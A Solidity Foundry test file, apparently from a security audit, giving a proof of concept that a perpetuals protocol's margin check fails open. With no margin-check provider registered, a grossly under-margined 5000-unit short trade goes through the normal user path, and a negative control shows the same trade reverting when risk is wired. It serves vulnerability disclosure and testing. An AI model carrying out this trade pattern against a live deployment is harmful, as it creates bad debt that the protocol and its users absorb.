// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "./TransactionProcessor.Trade.t.sol";
import "../src/core/plugins/ITransactionPlugin.sol";
import "forge-std/console.sol";

/// @title PoC (N-2 / PC-01): Perp margin checks fail open when CAP_MARGIN_CHECK is absent
/// @notice `PositionManager._marginCheck()` returns a no-op `NullMarginCheck` whenever
/// `capabilityProvider(CAP_MARGIN_CHECK) == address(0)` (PositionManager.sol:76-80), and the TYPE_TRADE plugin
/// (`OrderbookPlugin`) declares NO required capabilities, so `registerPlugin` accepts the full trading surface with
/// no margin provider wired. On a perp deployment where the Risk provider is not registered (deploy/upgrade window,
/// or never wired), a NORMAL user-signed trade routed through the real txBatcher path opens a position far below
/// maintenance margin that the real Risk check rejects — i.e. the safety net fails OPEN.
///
/// All three claims are proven through the real user path (no owner call performs the attack action):
///   (1) the TYPE_TRADE plugin requires no CAP_MARGIN_CHECK (registers without a margin provider);
///   (2) negative control: with Risk registered, the same user trade REVERTS ("PM: risk inc");
///   (3) with the provider absent, the identical user trade is ACCEPTED, leaving the account grossly under margin.
contract PoC_CapabilityRegistryNoop is TransactionProcessorTradeTest {
    int256 constant SHORT = 5000; // B sells 5000 synthetic against ~1 collateral -> grossly under maintenance margin

    /// A (deployer) buys SHORT synthetic from B (bOwner); BOTH orders are ordinary user-signed limit orders.
    function _userTrade() internal view returns (bytes[] memory txs) {
        Trade memory t = generateTrade(7777, SHORT, SHORT, true);
        txs = new bytes[](1);
        txs[0] = getMessage(TYPE_TRADE, abi.encode(t));
    }

    /// Submit through the REAL relay path: txBatcher (deployer) -> MultiTransactionProcessor -> TransactionProcessor
    /// -> OrderbookPlugin -> PositionManager.updatePosition (the margin-checked path). Returns the gate's decision.
    function _submitUserTrade() internal returns (bool ok, string memory reason) {
        bytes[] memory txs = _userTrade();
        uint64 cv = generalConfig.configVersion(); // external call BEFORE the prank so prank targets the right call
        vm.prank(deployer);                        // deployer is the configured txBatcher
        try multiTransactionProcessor.processMultiTransactions(txs, cv) {
            return (true, "");
        } catch Error(string memory r) {
            return (false, r);
        } catch {
            return (false, "(no reason)");
        }
    }

    /// (1) The TYPE_TRADE plugin declares NO required capabilities -> registerPlugin accepts the trading surface
    /// with no CAP_MARGIN_CHECK provider, so the fail-open state is reachable by ordinary deployment omission.
    function test_PoC_tradePluginDoesNotRequireMarginCapability() public view {
        address tradePlugin = transactionProcessor.txTypeToPlugin(TYPE_TRADE);
        bytes32[] memory req = ITransactionPlugin(tradePlugin).requiredCapabilities();
        assertEq(req.length, 0,
            "TYPE_TRADE plugin requires NO capabilities -> can be registered with no CAP_MARGIN_CHECK provider");
    }

    /// (2) Negative control: with the real Risk provider registered (base harness), the SAME normal user trade is
    /// REJECTED by the maintenance-margin check. This proves the margin check is the only thing standing between
    /// accept and reject — not the test harness.
    function test_sameUserTradeRevertsWhenRiskProviderRegistered() public {
        assertTrue(transactionProcessor.capabilityProvider(CAP_MARGIN_CHECK) != address(0),
            "precondition: a real CAP_MARGIN_CHECK provider (perp Risk) is wired");
        (bool ok, string memory reason) = _submitUserTrade();
        assertFalse(ok, "control: the real margin check rejects the under-margin trade");
        assertEq(reason, "PM: risk inc", "rejected by the maintenance-margin check (risk increase past margin)");
    }

    /// (3) Exploit via the USER PATH. Owner action is used ONLY to model the missing-provider deployment state (the
    /// not-wired condition test (1) shows is reachable by omission); the ATTACK action is a normal txBatcher-relayed,
    /// user-signed TYPE_TRADE. With no margin provider the identical trade is ACCEPTED, leaving the account far below
    /// maintenance margin (bad debt the protocol absorbs).
    function test_PoC_userTradeAcceptedWhenPerpMarginProviderMissing() public {
        vm.prank(deployer);
        transactionProcessor.unregisterPlugin(address(riskPlugin)); // deployment state: CAP_MARGIN_CHECK absent
        assertEq(transactionProcessor.capabilityProvider(CAP_MARGIN_CHECK), address(0),
            "no CAP_MARGIN_CHECK provider -> _marginCheck() falls back to NullMarginCheck (no-op)");

        (bool ok,) = _submitUserTrade();
        assertTrue(ok, "BUG: under-margin trade ACCEPTED via the normal user path (margin enforcement is a no-op)");

        AccountPosition memory p = positionManager.getAccountPositionByUID(bOwnerUid);
        (int256 value, int256 risk) = riskContract.getAccountPositionStatus(p); // Risk view (not the gate)
        assertEq(positionManager.getSyntheticBalance(bOwnerUid, synthAssetId), -SHORT, "B opened a 5000 short");
        assertGt(risk, value * FXP_32_ONE,
            "accepted account is FAR below maintenance margin (risk > value*FXP) -> bad debt");

        console.log("B synthetic short:", uint256(int256(SHORT)));
        console.log("B account value (FXP):", uint256(value));
        console.log("B maintenance risk (FXP^2):", uint256(risk));
    }
}
